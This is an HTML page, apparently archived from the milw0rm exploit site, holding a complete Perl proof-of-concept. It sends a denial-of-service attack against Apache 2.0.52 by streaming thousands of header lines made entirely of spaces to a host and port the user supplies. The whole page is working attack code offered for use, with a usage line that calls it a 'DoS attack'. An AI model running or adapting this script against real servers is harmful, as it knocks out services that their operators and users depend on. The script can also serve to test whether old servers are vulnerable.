<html><head><title>Apache 2.0.52 Multiple Space Header DoS (Perl code)</title></head><pre>#!/usr/bin/perl
# Noam Rathaus of Beyond Security Ltd.
#

use strict;
use IO::Socket::INET;

usage() unless (@ARGV == 2);

my $host = shift(@ARGV);
my $port = shift(@ARGV);

my $socket = IO::Socket::INET-&gt;new(proto=&gt;'tcp', PeerAddr=&gt;$host, PeerPort=&gt;$port);
$socket or die &quot;Cannot connect to the host.\n&quot;;

$socket-&gt;autoflush(1);

print &quot;Sending...\n&quot;;

print $socket &quot;GET / HTTP/1.0\n&quot;;

for (my $count = 0; $count &lt; 8000; $count++)
{
 if ($count % 10 == 0)
 {
  print &quot;.&quot;;
 }
 print $socket (&quot; &quot;x8000).&quot;\n&quot;;
}

print $socket &quot;\n&quot;;

print &quot;Done.\n&quot;;

while (&lt;$socket&gt;)
{
 print $_;
}

close($socket);
exit(0);

sub usage
{
 print &quot;\nApache 2.0.52 8000x\&quot; \&quot; DoS attack\n&quot;;
 print &quot;\nUsage: apache_xpl.pl [host] [port]\n&quot;;
 print &quot;\n&quot;;
 exit(1);
}

# milw0rm.com [2004-11-02]</pre></html>